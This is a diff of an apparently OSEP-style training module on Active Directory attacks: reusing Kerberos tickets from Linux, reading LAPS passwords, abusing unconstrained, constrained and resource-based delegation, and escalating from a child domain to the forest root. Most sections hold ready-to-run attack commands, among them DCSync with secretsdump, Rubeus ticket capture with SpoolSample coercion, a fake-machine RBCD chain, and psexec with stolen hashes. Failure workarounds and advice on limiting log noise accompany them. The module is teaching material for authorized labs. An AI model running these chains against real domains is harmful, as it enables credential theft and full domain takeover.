@@ -2,66 +2,62 @@
 For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
 :::
 
-# 12 · AD Attacks: Tickets, Delegation, LAPS, Trust and ADCS (Scenarios 47, 49–55)
+# AD tickets, delegation, LAPS, trusts, and ADCS
 
-> **Prerequisites:** follow [00-environment-and-infra](/modules/00-environment-and-infra) to set up the attack machine directory, listeners and delivery. Shared placeholders: `LHOST LPORT TARGET DOMAIN USER PASS NTHASH PAYLOAD URL`.
->
-> **Course mapping:** scenario 47 ← Chapter 19 (§19.3 Kerberos on Linux / keytab / ccache / Impacket); scenario 49 ← Chapter 17 (§17.1.2 LAPS) and Chapter 21 (§21.1 AD object permissions); scenarios 50–52 ← Chapter 21 (§21.2 Kerberos delegation) and Chapter 23 (§23.1 unconstrained / constrained S4U / RBCD); scenario 53 ← Chapter 21 (§21.4.1 Extra SIDs and §21.5–21.6 forest trusts); scenarios 54–55 ← Chapter 22 (§22.2.1 misconfigured certificate templates ESC1, §22.2.2 NTLM relay to ADCS HTTP endpoints ESC8).
+Most of this module is run from Kali (Impacket + Certipy). Capture tickets on Windows only when you must induce authentication. Before any command, write down where the ticket came from, which service it is for, and whose identity it carries — a perfect command with the wrong ticket is still useless.
 
-**Cross-cutting principle**: 80% of this module's work happens on the Kali attack machine (impacket suite + certipy); only "inducing authentication / capturing tickets" has to happen on the target Windows host. Write down "where the ticket comes from, which service it is for, and whose identity it carries" before you touch anything - if the ticket points the wrong way, a perfect command is still useless.
+Attacker prep:
 
-| Scenario | One-line goal | Scripts used |
-|---|---|---|
-| 47 | Linux holds a ticket -> Windows service | `m12-kerberos-tickets-linux.sh` |
-| 49 | Read LAPS -> execute as local administrator | `m12-ad-enum-windows.ps1` / `m12-ad-enum-linux.sh` + `m12-laps-and-trust-notes.md` |
-| 50 | Unconstrained delegation captures a DC TGT -> DCSync | `m12-delegation-attacks.ps1` |
-| 51 | RBCD: write `AllowedToAct` -> impersonate an administrator | `m12-delegation-attacks.ps1` |
-| 52 | Constrained delegation S4U -> target SPN service | `m12-delegation-attacks.ps1` |
-| 53 | Subdomain -> forest root (trust check + Extra SID) | `m12-ad-enum-linux.sh` + `m12-laps-and-trust-notes.md` |
-| 54 | ESC1 template -> certificate authentication | `m12-adcs-esc1-esc8.sh` |
-| 55 | ESC8 HTTP enrollment relay | `m12-adcs-esc1-esc8.sh` |
+```bash
+# install everything in one go (Kali)
+sudo apt install -y impacket-scripts ldap-utils krb5-user   # put DOMAIN in the Realm prompt
+pipx install certipy-ad
+# DNS convenience: put the DC/CA/target FQDNs in /etc/hosts (Kerberos does not allow IPs)
+# ticket directory
+mkdir -p ~/osep/tickets ~/osep/loot/certs
+```
 
----
+Windows-side tools (copy to the target host, from a fixed source): `Rubeus.exe`, `SpoolSample.exe` (or the single-file printerbug), `SharpHound.exe` (enumeration aid, not required). If Impacket is not installed, `python3 -m pip install impacket` and call the modules; take the command names from the Kali packaging (`impacket-wmiexec` and friends).
 
-## Scenario 47: You already have a domain ticket on Linux, but you need to reach a Windows service
+## Domain ticket on Linux, need a Windows service
 
-**Situation**: You control a domain-joined Linux host with a valid, usable credential cache (ccache) or keytab; the next hop is a service in the Windows domain (SMB/WinRM/HTTP), and you have no cleartext password.
+If you already hold a valid ccache or keytab on Linux and the next hop is a Windows service (SMB/WinRM/HTTP) with no cleartext password, authenticate with `-k`. The clock must be within 5 minutes of the DC — compare with `date` first. Use the FQDN that matches the SPN (never an IP). Impacket's domain argument is the lowercase FQDN; the realm in `/etc/krb5.conf` is uppercase.
 
-**Assumptions**: The Linux clock is within 5 minutes of the DC (hard Kerberos requirement - compare with `date` first); the attack machine can reach TCP/UDP 88 on the DC and 445/5985 on the target; you know `DOMAIN` (FQDN, correct case) plus the DC hostname/IP. Note: key distribution must use the **all-lowercase domain name**, and the target must be reached by the **FQDN that matches the SPN** (never by IP).
+- [ ] Export `KRB5CCNAME` and inspect the cache with `klist -e`
+- [ ] Confirm `/etc/krb5.conf` plus `/etc/hosts` (`DC01.corp.local` and the `TARGET` FQDN must both resolve)
+- [ ] Authenticate directly with the TGT/TGS
+- [ ] If that identity has no access, request a TGS for the service you actually need
 
-**Prepare (attacker side)**:
+Set the cache and inspect it:
+
 ```bash
 export KRB5CCNAME=/home/kali/osep/tickets/current.ccache   # session-level; every -k tool reads it
 klist -e          # show whose ticket is in the cache and its enctype (rc4/aes decides whether the DC accepts it)
 # kirbi (Rubeus) -> ccache conversion; keytab -> kinit is in m12-kerberos-tickets-linux.sh
 ```
-The minimal `/etc/krb5.conf` template plus `/etc/hosts` (`DC01.corp.local` and the `TARGET` FQDN must both resolve) are in `m12-kerberos-tickets-linux.sh`.
 
-**Procedure**:
+The minimal `/etc/krb5.conf` template plus `/etc/hosts` are in `m12-kerberos-tickets-linux.sh`.
+
+Authenticate with the TGT/TGS (`-k` reads `KRB5CCNAME`, `-no-pass` stops asking for a password):
+
 ```bash
-# 1) Authenticate directly with the TGT/TGS (-k reads KRB5CCNAME, -no-pass stops asking for a password)
 smbclient -k -L //WS02.corp.local
 impacket-wmiexec -k -no-pass DOMAIN/USER@WS02.corp.local     # needs the cifs/WS02 TGS; the tool requests it automatically
 impacket-secretsdump -k -no-pass DC01.corp.local             # needs the DC machine ticket; first confirm whose it is
-evil-winrm -i ws02.corp.local -k                             # the Kerberos path needs wsman/WS02
-# 2) The ticket's identity has no access to the target service -> use the existing ticket to request another service's TGS
+evil-winrm -i WS02.corp.local -r corp.local                  # Kerberos path; needs a wsman/WS02 TGS and reads KRB5CCNAME
+# The ticket's identity has no access to the target service -> use the existing ticket to request another service's TGS
 #    (the key only has to be in the cache; no password needed again. See the ask_tgs function in the script)
 ```
-**Scripts used**: `m12-kerberos-tickets-linux.sh` (ccache/keytab use, format conversion, krb5.conf template, requesting a TGS per service).
 
-**Validation**: `smbclient -k -L //WS02` lists shares / `wmiexec` returns a shell = pass; `klist` shows the newly issued TGS. If you get `KRB_AP_ERR_MODIFIED`, it is usually a mismatch between the ticket principal and the SPN or enctype, not a network problem.
+<!-- VERIFY: evil-winrm Kerberos is `-i <FQDN> -r <realm>` and reads KRB5CCNAME. The previous `-k` flag is `--priv-key`, not Kerberos. Confirm against the installed `evil-winrm --help`. -->
 
-**Failure branches and alternatives**:
-- There is a ticket in the cache but the target is unreachable -> (1) check that the target FQDN matches the SPN (`smbclient -k -L //WS02` vs `//ws02.corp.local`); (2) your ticket principal may be denied by that service's ACL -> switch service (if WinRM is closed, use SMB).
-- The KDC reports an unsupported enctype -> in `/etc/krb5.conf`, add `rc4-hmac` to `default_tkt_enctypes/default_tgs_enctypes`, or add `aes256-cts-hmac-sha1-96`, so the list matches what the DC supports.
-- Clock skew error (`Clock skew too great`) -> `sudo ntpdate DC01` or fix the clock manually; the skew must stay under 5 minutes.
-- The Windows service sits on an internal segment (target only reachable from inside) -> set up port forwarding/Ligolo first ([08-pivoting-tunneling](/modules/08-pivoting-tunneling)), **do Kerberos after the tunnel is up**, and remember that every machine on the forwarding path must also reach the DC on port 88.
+`smbclient -k -L //WS02` listing shares / `wmiexec` returning a shell means it worked; `klist` shows the newly issued TGS. If you get `KRB_AP_ERR_MODIFIED`, it is usually a mismatch between the ticket principal and the SPN or enctype, not a network problem.
 
-**Exam / OPSEC notes**: Verify the ticket identity with something harmless first (`smbclient -L`) before reaching for execution tools; store ccache files per session (`~/osep/tickets/`) so a domain A ticket is never used against domain B; every `-k` tool reads `KRB5CCNAME`, so switching tickets requires an explicit `export`, and confirm with `klist` right before the command.
+If there is a ticket in the cache but the target is unreachable, check that the target FQDN matches the SPN (`smbclient -k -L //WS02` vs `//ws02.corp.local`). If your ticket principal is denied by that service's ACL, switch service (if WinRM is closed, use SMB). If the KDC reports an unsupported enctype, in `/etc/krb5.conf` add `rc4-hmac` to `default_tkt_enctypes` / `default_tgs_enctypes`, or add `aes256-cts-hmac-sha1-96`, so the list matches what the DC supports. If you get `Clock skew too great`, `sudo ntpdate DC01` or fix the clock manually; the skew must stay under 5 minutes. If the Windows service sits on an internal segment, set up port forwarding / Ligolo first ([pivoting / tunneling](/modules/08-pivoting-tunneling)), do Kerberos after the tunnel is up, and remember that every machine on the forwarding path must also reach the DC on port 88.
 
----
+Verify the ticket identity with something harmless first (`smbclient -L`) before reaching for execution tools. Store ccache files per session (`~/osep/tickets/`) so a domain A ticket is never used against domain B. Every `-k` tool reads `KRB5CCNAME`, so switching tickets requires an explicit `export` — confirm with `klist` right before the command.
 
-#### `m12-kerberos-tickets-linux.sh`
+::: details `m12-kerberos-tickets-linux.sh` · click to expand
 
 ````bash
 #!/usr/bin/env bash
@@ -523,39 +519,41 @@ printf '\n[*] Mode %s finished. Commands are printed by default; add -x to actua
 info "Next: get a ticket -> refine with -m convert/tgs -> land it with -m auth; for cross-domain see -m cross."
 ````
 
-## Scenario 49: No local privilege escalation path, but the current domain user can read LAPS
+:::
 
-**Situation**: The initial session is a plain domain user; there is no local privilege escalation on this host; but the directory ACL allows reading the local administrator password (LAPS) of **another machine**. Goal: execute remotely as that machine's local administrator.
 
-**Assumptions**: The target domain has LAPS deployed and the current user can read the password attribute (deployment usually grants read to Domain Users, or you obtained it via ACL/GenericRead); the LAPS password is the password of the **target machine's local Administrator**, not a domain user. First work out whether the target uses **legacy LAPS (AdmPwd, attribute `ms-Mcs-AdmPwd*`)** or **Windows LAPS (attribute `msLAPS-Password*`)** - the two are queried differently.
+## No local privesc, but the user can read LAPS
 
-**Prepare (attacker side)**: Confirm you can query LDAP (`ldapsearch` or impacket); prepare remote-execution templates (target has 445 -> `wmiexec/psexec`; only 5985 -> WinRM). **Windows-side** query script: `m12-ad-enum-windows.ps1`.
+If the initial session is a plain domain user with no local privilege escalation, but the directory ACL allows reading another machine's local administrator password, execute remotely as that machine's local Administrator — not as a domain user. First work out whether the target uses legacy LAPS (AdmPwd, attribute `ms-Mcs-AdmPwd*`) or Windows LAPS (attribute `msLAPS-Password*`) — the two are queried differently.
 
-**Procedure**:
+- [ ] Confirm you can query LDAP (`ldapsearch` or Impacket)
+- [ ] Probe both LAPS attribute sets at once
+- [ ] Execute remotely once you have the cleartext (445 → `wmiexec`/`psexec`; only 5985 → WinRM)
+
+Read the attributes straight over LDAP:
+
 ```bash
-# Attack machine (Linux) reads the attributes straight over LDAP - first probe which LAPS version is present (query both attributes)
+# Attack machine (Linux) — first probe which LAPS version is present (query both attributes)
 ldapsearch -x -H ldap://DC01.corp.local -D "CORP\\USER" -w 'PASS' \
   -b "DC=corp,DC=local" "(objectClass=computer)" \
   ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-EncryptedPassword
 # Execute remotely once you have the cleartext
 impacket-wmiexec CORP/Administrator@WS02.corp.local -hashes :NTHASH   # or -p 'password'
 ```
-Windows side (session host): `m12-ad-enum-windows.ps1 -Mode LAPS -ComputerName WS02`; a quick reference for both versions is in `m12-laps-and-trust-notes.md`.
 
-**Scripts used**: `m12-ad-enum-windows.ps1` (both LAPS versions + enumeration), `m12-ad-enum-linux.sh` (bulk LDAP enumeration including LAPS attributes), `m12-laps-and-trust-notes.md` (command quick reference).
+Windows side (session host): `m12-ad-enum-windows.ps1 -Mode LAPS -ComputerName WS02`. A quick reference for both versions is in `m12-laps-and-trust-notes.md`.
 
-**Validation**: The password you read gets you into WS02 with `wmiexec`/`psexec`; if the password looks right but will not work, first confirm it belongs to WS02 (LAPS passwords are per-machine), then confirm the remote-execution protocol is open.
+The password you read getting you into WS02 with `wmiexec`/`psexec` is the check. If the password looks right but will not work, first confirm it belongs to WS02 (LAPS passwords are per-machine), then confirm the remote-execution protocol is open.
 
-**Failure branches and alternatives**:
-- Attribute empty / unreadable -> (1) the machine may not have LAPS enabled or the password has not been rotated yet - enumerate other machines (query the whole domain at once with `(ms-Mcs-AdmPwd=*)`); (2) the current user genuinely lacks read access -> use another entry point from this module (RBCD/delegation/certificate) to escalate to an identity that can read it.
-- Windows LAPS stores `msLAPS-EncryptedPassword` (an encrypted value) -> reading cleartext requires `Get-LapsADPassword` (decryption is done with the target machine's key) or the LAPS module on the DC; when plain LDAP cannot get cleartext, **do not keep hammering it** - switch to a machine in `msLAPS-Password` cleartext mode, or fall back to a legacy LAPS machine.
-- WinRM open but SMB closed -> use `evil-winrm`; both closed -> the LAPS password is useless, go back to enumeration for another entry point.
+If the attribute is empty or unreadable, the machine may not have LAPS enabled or the password has not been rotated yet — enumerate other machines (query the whole domain at once with `(ms-Mcs-AdmPwd=*)`). If the current user genuinely lacks read access, use another entry point from this module (RBCD / delegation / certificate) to escalate to an identity that can read it.
 
-**Exam / OPSEC notes**: LAPS queries generate LDAP audit entries; that is expected enumeration behaviour, but do not dump every password in the domain and then try them one by one - only touch the machines the scenario actually needs. Do not echo the password into a long command that stays readable in shell history (use an environment variable or a script parameter).
+If Windows LAPS stores `msLAPS-EncryptedPassword`, reading cleartext requires `Get-LapsADPassword` or the LAPS module on the DC (decryption is done by a principal authorized to decrypt, not by "just reading LDAP"). When plain LDAP cannot get cleartext, do not keep hammering it — switch to a machine in `msLAPS-Password` cleartext mode, or fall back to a legacy LAPS machine.
 
----
+If WinRM is open but SMB is closed, use `evil-winrm`. If both are closed, the LAPS password is useless — go back to enumeration for another entry point.
 
-#### `m12-ad-enum-windows.ps1`
+LAPS queries generate LDAP audit entries; that is expected enumeration behaviour, but do not dump every password in the domain and then try them one by one — only touch the machines the scenario actually needs. Do not echo the password into a long command that stays readable in shell history (use an environment variable or a script parameter).
+
+::: details `m12-ad-enum-windows.ps1` · click to expand
 
 ````powershell
 <#
@@ -1077,15 +1075,20 @@ Write-Output "[*] Done -Mode $Mode. Delegation/RBCD landing: m12-delegation-atta
 Write-Output "[*] Same enumeration on Linux: m12-ad-enum-linux.sh; trust and Extra SID: m12-laps-and-trust-notes.md"
 ````
 
-## Scenario 50: You control an unconstrained delegation machine but have no domain-level identity yet
+:::
 
-**Situation**: You control a machine configured for **unconstrained delegation (Trusted for Delegation)** and can run Rubeus / trigger authentication on it; you still have no domain admin identity. The next move depends on whether you can make a high-value identity (a DC machine account or a domain admin) authenticate to that machine and capture its TGT.
 
-**Assumptions**: The target DC's / domain admin's SPN ports (445/5985, or 88 for a callback) can reach the unconstrained host; you run the capture tool as SYSTEM on the unconstrained host. Once you hold the DC machine account's TGT you can DCSync (a DC holds replication rights); a domain admin's TGT means direct impersonation.
+## Unconstrained delegation host, no domain identity yet
 
-**Prepare (attacker side)**: On the unconstrained host, stage `Rubeus.exe` plus an authentication trigger (`SpoolSample.exe` / `printerbug` / `PetitPotam`); on the attack machine, stage `impacket-ticketConverter` and `secretsdump`. Trigger methods for induced authentication are in `m12-delegation-attacks.ps1 -Mode Unconstrained`.
+If you control a machine configured for unconstrained delegation (Trusted for Delegation) and can run Rubeus / trigger authentication on it, but you still have no domain admin identity, make a high-value identity (a DC machine account or a domain admin) authenticate to that machine and capture its TGT. A DC machine account's TGT lets you DCSync; a domain admin's TGT means direct impersonation. Run the capture tool as SYSTEM on the unconstrained host.
 
-**Procedure**:
+- [ ] Stage `Rubeus.exe` plus an authentication trigger (`SpoolSample.exe` / `printerbug` / `PetitPotam`) on the unconstrained host
+- [ ] Stage `impacket-ticketConverter` and `secretsdump` on the attack machine
+- [ ] Start Rubeus monitor, then coerce the DC
+- [ ] Convert the captured TGT and DCSync
+
+On the unconstrained host (SYSTEM), start capturing tickets, then coerce the DC:
+
 ```powershell
 # 1) On the unconstrained host (SYSTEM), start capturing tickets in the background
 Rubeus.exe monitor /interval:5 /nowrap
@@ -1093,27 +1096,27 @@ Rubeus.exe monitor /interval:5 /nowrap
 SpoolSample.exe DC01 $env:COMPUTERNAME        # or printerbug DC01 $env:COMPUTERNAME
 # 3) When a base64 TGT for DC01$ shows up in the monitor output -> save it as dc.txt
 ```
+
+Convert and use it on the attack machine:
+
 ```bash
-# 4) Convert and use it on the attack machine
 impacket-ticketConverter dc.txt dc.ccache
 export KRB5CCNAME=dc.ccache
 impacket-secretsdump -k -no-pass DC01.corp.local        # DC machine account -> DCSync krbtgt/domain admin hashes
-impacket-psexec -k -no-pass CORP/Administrator@DC01.corp.local -hashes :NTHASH  # once you have the hash
+impacket-psexec CORP/Administrator@DC01.corp.local -hashes :NTHASH  # once you have the hash
 ```
-**Scripts used**: `m12-delegation-attacks.ps1` (Rubeus monitor + trigger + base64 export template; the Linux-side conversion commands are in the comments too).
 
-**Validation**: `secretsdump` dumping `krbtgt`/administrator hashes proves you captured the DC machine TGT; check with `klist` first that the principal is `DC01$`.
+Trigger methods for induced authentication are in `m12-delegation-attacks.ps1 -Mode Unconstrained`. `secretsdump` dumping `krbtgt` / administrator hashes proves you captured the DC machine TGT; check with `klist` first that the principal is `DC01$`.
 
-**Failure branches and alternatives**:
-- SpoolSample returns nothing / errors (patched, or RPC blocked) -> switch vector: `PetitPotam` (EFSRPC), `DFSCoerce`, the MS-RPRN variant `dementor`; still nothing -> go passive: leave Rubeus monitor running and wait for a real domain admin to log on to this machine or touch one of its services.
-- You captured a normal user's TGT (not a DC/domain admin) -> use it to move laterally first (the machines that user can reach), or keep waiting for a higher-value authentication; you can also widen coverage with the `Rubeus harvest` idea.
-- The unconstrained host and the DC are not in mutually reachable segments -> if you cannot induce authentication, the host's only remaining value is passive collection; go back to enumeration for another entry point (do not burn time on a callback that cannot happen).
+If SpoolSample returns nothing or errors (patched, or RPC blocked), switch vector: `PetitPotam` (EFSRPC), `DFSCoerce`, the MS-RPRN variant `dementor`. Still nothing → go passive: leave Rubeus monitor running and wait for a real domain admin to log on to this machine or touch one of its services.
 
-**Exam / OPSEC notes**: Running `Rubeus monitor` on an unconstrained host captures every authentication continuously and is loud in the logs - stop it as soon as the job is done (the DC ticket is in hand); export captured tickets to the attack machine immediately and then clean up the local base64 text. Do not take a domain admin TGT and start `psexec`-ing everywhere; run `secretsdump` first to confirm the value, then choose the smallest action that works.
+If you captured a normal user's TGT (not a DC / domain admin), use it to move laterally first (the machines that user can reach), or keep waiting for a higher-value authentication; you can also widen coverage with the `Rubeus harvest` idea.
 
----
+If the unconstrained host and the DC are not in mutually reachable segments, you cannot induce authentication — the host's only remaining value is passive collection. Go back to enumeration for another entry point (do not burn time on a callback that cannot happen).
 
-#### `m12-delegation-attacks.ps1`
+Running `Rubeus monitor` on an unconstrained host captures every authentication continuously and is loud in the logs — stop it as soon as the DC ticket is in hand. Export captured tickets to the attack machine immediately and then clean up the local base64 text. Do not take a domain admin TGT and start `psexec`-ing everywhere; run `secretsdump` first to confirm the value, then choose the smallest action that works.
+
+::: details `m12-delegation-attacks.ps1` · click to expand
 
 ````powershell
 <#
@@ -1561,15 +1564,19 @@ Write-Output "[*] Tip: the high-value ticket actions (secretsdump / ticketer) al
 Write-Output "[*]       the Windows side only captures tickets and coerces authentication; roll back RBCD and clean up tickets when done."
 ````
 
-## Scenario 51: Write permissions on a computer object, but no direct admin on the target host (RBCD)
+:::
 
-**Situation**: You have write permissions on the computer object of the target machine (say WS02) — typically GenericWrite/GenericAll, or the ability to modify `msDS-AllowedToActOnBehalfOfOtherIdentity`. You also have a "principal you can impersonate" (a machine account you create yourself is enough; the default domain policy lets ordinary users add 10). Goal: reach WS02 as an administrator.
 
-**Assumptions**: The current user can add machine accounts to the domain (`MachineAccountQuota`>0, default 10); WS02's `msDS-AllowedToActOnBehalfOfOtherIdentity` is currently empty (never abused); the target account (Administrator) is not in Protected Users and does not have "Account is sensitive and cannot be delegated" checked.
+## Write access on a computer object, no admin on the host (RBCD)
 
-**Prepare (attacker side)**: impacket `addcomputer / getTGT / getST / wmiexec`; on the **Windows side** the attribute-writing function is in `m12-delegation-attacks.ps1 -Mode RBCD` (writes the security descriptor with .NET ADSI, no dependency on the ActiveDirectory module).
+If you have write permissions on the computer object of the target machine (say WS02) — typically GenericWrite / GenericAll, or the ability to modify `msDS-AllowedToActOnBehalfOfOtherIdentity` — and a principal you can impersonate (a machine account you create yourself is enough; the default domain policy lets ordinary users add 10), reach WS02 as an administrator. The target account (Administrator) must not be in Protected Users and must not have "Account is sensitive and cannot be delegated" checked.
 
-**Procedure**:
+- [ ] Confirm `MachineAccountQuota` > 0 (default 10), or pick an existing service account you already control
+- [ ] Add a fake machine (write down the password)
+- [ ] Write the fake machine's SID into WS02's `msDS-AllowedToActOnBehalfOfOtherIdentity`
+- [ ] Get a TGT for the fake machine, impersonate Administrator, ask for a `cifs/WS02` service ticket
+- [ ] Roll the attribute back when the task is done
+
 ```bash
 # ① Add a fake machine (write down the password)
 impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Fake#Passw0rd' \
@@ -1584,31 +1591,32 @@ impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
 export KRB5CCNAME=Administrator.ccache
 impacket-wmiexec -k -no-pass CORP/Administrator@WS02.corp.local
 ```
-**Scripts used**: `m12-delegation-attacks.ps1` (RBCD mode: look up the SID, write the attribute, roll back).
 
-**Validation**: `wmiexec -k` gives you a shell; `klist` shows the TGS for `cifs/WS02.corp.local` with `Administrator` as the principal.
+On the Windows side the attribute-writing function is in `m12-delegation-attacks.ps1 -Mode RBCD` (writes the security descriptor with .NET ADSI, no dependency on the ActiveDirectory module). `wmiexec -k` giving you a shell is the check; `klist` shows the TGS for `cifs/WS02.corp.local` with `Administrator` as the principal.
 
-**Failure branches and alternatives**:
-- `addcomputer` returns a quota/permission error (MAQ=0) -> use an **existing service account whose password or hash you already control** (with an SPN) as the fake principal; the rest of the flow is unchanged (it must be an account you hold credentials for).
-- Attribute write fails -> confirm you are writing the full DN of the WS02 computer object (not a container); clear the attribute with the rollback function in `m12-delegation-attacks.ps1` and retry; if GenericWrite does not cover that attribute, check whether the target object has a looser ACL (switch to a machine where you definitely have write permissions).
-- `getST` returns a KDC error -> S4U2Self succeeded but S4U2Proxy was refused. Common causes: the target account is sensitive and cannot be delegated / the fake principal has no SPN (`addcomputer` registers `host/FAKE01` automatically, but if you create the account by hand you must add the SPN) / the ticket expired — redo step 1).
-- Impersonating Administrator is refused -> impersonate a different administrator instead (for example another member of the Domain Admins group).
+If `addcomputer` returns a quota/permission error (MAQ=0), use an existing service account whose password or hash you already control (with an SPN) as the fake principal; the rest of the flow is unchanged (it must be an account you hold credentials for).
 
-**Exam / OPSEC notes**: Changing the delegation attribute on WS02 is a **persistent artifact**. You must roll it back when the task is done (the script provides a rollback); otherwise the target machine is left in a taken-over state and you lose points on review. The fake machine account can be deleted afterwards (optional, but at minimum delete the ticket cache you no longer use).
+If the attribute write fails, confirm you are writing the full DN of the WS02 computer object (not a container); clear the attribute with the rollback function in `m12-delegation-attacks.ps1` and retry. If GenericWrite does not cover that attribute, check whether the target object has a looser ACL (switch to a machine where you definitely have write permissions).
 
----
+If `getST` returns a KDC error, S4U2Self succeeded but S4U2Proxy was refused. Common causes: the target account is sensitive and cannot be delegated / the fake principal has no SPN (`addcomputer` registers `host/FAKE01` automatically, but if you create the account by hand you must add the SPN) / the ticket expired — redo the TGT step.
 
-## Scenario 52: A service account is under your control with constrained delegation, but you can only reach the listed services
+If impersonating Administrator is refused, impersonate a different administrator instead (for example another member of the Domain Admins group).
 
-**Situation**: You hold a service account configured with **constrained delegation (AllowedToDelegateTo)** (say `svc_sql`). It can impersonate any user but **only** against the SPNs the delegation lists (say `cifs/WS02` / `http/WS02`) — not against an arbitrary machine.
+Changing the delegation attribute on WS02 is a persistent artifact. You must roll it back when the task is done (the script provides a rollback); otherwise the target machine is left in a taken-over state. The fake machine account can be deleted afterwards (optional, but at minimum delete the ticket cache you no longer use).
 
-**Assumptions**: The service account credentials are valid; you know the delegation target SPN and host (enumerate with `m12-ad-enum-windows.ps1 -Mode Delegation`); and you distinguish the two sub-cases — ① `TrustedToAuthForDelegation` (protocol transition, S4U2Self does not need the impersonated user's password); ② no protocol transition -> you must hold the impersonated user's TGT or password (the "constrained delegation + known user credentials" scenario, supplied directly to `getST` via `-hashes`/`-aesKey`).
+## Constrained delegation service account, only listed SPNs
 
-**Prepare (attacker side)**: `impacket-getST`; the Windows-side `Rubeus s4u` template is in `m12-delegation-attacks.ps1 -Mode Constrained`.
+If you hold a service account configured with constrained delegation (`AllowedToDelegateTo`) (say `svc_sql`), it can impersonate any user but only against the SPNs the delegation lists (say `cifs/WS02` / `http/WS02`) — not against an arbitrary machine. Distinguish the two sub-cases: `TrustedToAuthForDelegation` (protocol transition, S4U2Self does not need the impersonated user's password) vs no protocol transition (you must hold the impersonated user's TGT or password, supplied to `getST` via `-hashes` / `-aesKey`).
 
-**Procedure**:
+- [ ] Enumerate the delegation target SPN and host (`m12-ad-enum-windows.ps1 -Mode Delegation`)
+- [ ] If protocol transition is on, take a TGT for the service account → S4U2Self → S4U2Proxy
+- [ ] If it is off, pass the impersonated user's own hash
+- [ ] Use the ticket only against the hosts of the listed SPNs
+
+Protocol transition (most common):
+
 ```bash
-# Protocol transition (most common): take a TGT for svc_sql -> S4U2Self(Administrator) -> S4U2Proxy(cifs/WS02)
+# take a TGT for svc_sql -> S4U2Self(Administrator) -> S4U2Proxy(cifs/WS02)
 impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
   -dc-ip DC01.corp.local 'CORP/svc_sql:PASS'
 export KRB5CCNAME=Administrator.ccache
@@ -1617,31 +1625,27 @@ impacket-wmiexec -k -no-pass CORP/Administrator@WS02.corp.local
 impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
   -hashes :NTHASH -dc-ip DC01.corp.local 'CORP/svc_sql:PASS'
 ```
-Windows-side equivalent: `Rubeus.exe s4u /user:svc_sql /password:PASS /impersonateuser:Administrator /msdsspn:cifs/WS02 /ptt` (protocol transition); without transition add `/aes256` to Rubeus (the impersonated user's hash cannot be used for S4U2Self, so you can only take the S4U2Proxy path).
 
-**Scripts used**: `m12-delegation-attacks.ps1` (templates for the two constrained delegation sub-cases + target SPN enumeration).
+Windows-side equivalent: `Rubeus.exe s4u /user:svc_sql /password:PASS /impersonateuser:Administrator /msdsspn:cifs/WS02 /ptt` (protocol transition); without transition add `/aes256` to Rubeus (the impersonated user's hash cannot be used for S4U2Self, so you can only take the S4U2Proxy path). Templates for both sub-cases are in `m12-delegation-attacks.ps1 -Mode Constrained`.
 
-**Validation**: once you have `Administrator.ccache`, `wmiexec -k` gets you into WS02; if only an HTTP SPN is allowed, validate with `curl --negotiate` or the matching WinRM tool instead of SMB.
+Once you have `Administrator.ccache`, `wmiexec -k` gets you into WS02. If only an HTTP SPN is allowed, validate with `curl --negotiate` or the matching WinRM tool instead of SMB.
 
-**Failure branches and alternatives**:
-- The delegation target is `cifs/WS02` but you want another service on the same host (say `http`) -> if the delegation list holds only the single entry `cifs/WS02`, you cannot change the service class; check whether `AllowedToDelegateTo` also contains `http`/`wsman`, and use `-altservice` only when the host is the same and the configuration allows multiple service classes.
-- The impersonated Administrator cannot get in (sensitive and cannot be delegated) -> switch to an administrator account that can be impersonated.
-- You have only the NTHASH and no cleartext password -> pass `-hashes` to `getST`; if the DC enforces AES-only you need `-aesKey` (take it from enumeration).
-- The service account itself needs an SPN (S4U requires the impersonated identity to be a service account) — svc accounts usually ship with one; if it has none, add one first.
+If the delegation target is `cifs/WS02` but you want another service on the same host (say `http`), and the delegation list holds only the single entry `cifs/WS02`, you cannot change the service class. Check whether `AllowedToDelegateTo` also contains `http` / `wsman`, and use `-altservice` only when the host is the same and the configuration allows multiple service classes.
 
-**Exam / OPSEC notes**: Constrained delegation only works against the **hosts of the listed SPNs** — do not waste time trying to use the ticket on other machines. Keep the impersonated principal and the target service as narrow as the scenario allows, and clean up the ccache as soon as you have the target so the ticket does not linger on the attacker box.
+If the impersonated Administrator cannot get in (sensitive and cannot be delegated), switch to an administrator account that can be impersonated. If you have only the NTHASH and no cleartext password, pass `-hashes` to `getST`; if the DC enforces AES-only you need `-aesKey` (take it from enumeration). The service account itself needs an SPN (S4U requires the impersonating identity to be a service account) — svc accounts usually ship with one; if it has none, add one first.
 
----
+Constrained delegation only works against the hosts of the listed SPNs — do not waste time trying to use the ticket on other machines. Keep the impersonated principal and the target service as narrow as the scenario allows, and clean up the ccache as soon as you have the target.
 
-## Scenario 53: You own high privileges in a child domain, but the ultimate target is the forest root
+## Child-domain admin, target is the forest root
 
-**Situation**: You already control high privileges in a child domain (`child.corp.local`) — including the child krbtgt or a child DA you can dump — and the final target asset sits at the forest root (`corp.local`). **Do not assume this always works**: first determine the trust type/direction and whether SID filtering is in effect.
+If you already control high privileges in a child domain (`child.corp.local`) — including the child krbtgt or a child DA you can dump — and the final target sits at the forest root (`corp.local`), do not assume this always works. First determine the trust type / direction and whether SID filtering is in effect. An intra-forest parent/child trust (`TrustAttributes: WITHIN_FOREST`, SID filtering off by default) is the Extra SID path; an external / inter-forest trust (SID filtering on by default) makes Extra SID useless.
 
-**Assumptions**: You need ① the trust type — an intra-forest parent/child trust (`TrustAttributes: WITHIN_FOREST`, SID filtering off by default -> the Extra SID attack works), or an external/inter-forest trust (SID filtering on by default -> Extra SID is useless); ② the direction — two-way/one-way (you only need to be able to authenticate across); ③ the child krbtgt hash (required for the Extra SID golden ticket) or the child trust key.
+- [ ] On the child domain, check the trust attributes and both SIDs
+- [ ] Confirm the direction is one you can authenticate across
+- [ ] Get the child krbtgt hash (or the child trust key)
+- [ ] Build a golden ticket with the child krbtgt and stuff in the root domain Enterprise Admins SID (`-519`)
+- [ ] Authenticate to root-domain assets
 
-**Prepare (attacker side)**: enumerate trusts with `nltest`/PowerShell (script `m12-ad-enum-linux.sh -Mode Trust`); `impacket-ticketer` (to build the Extra SID golden ticket); confirm the root domain SID (`Get-DomainSID`/ldapsearch).
-
-**Procedure**:
 ```bash
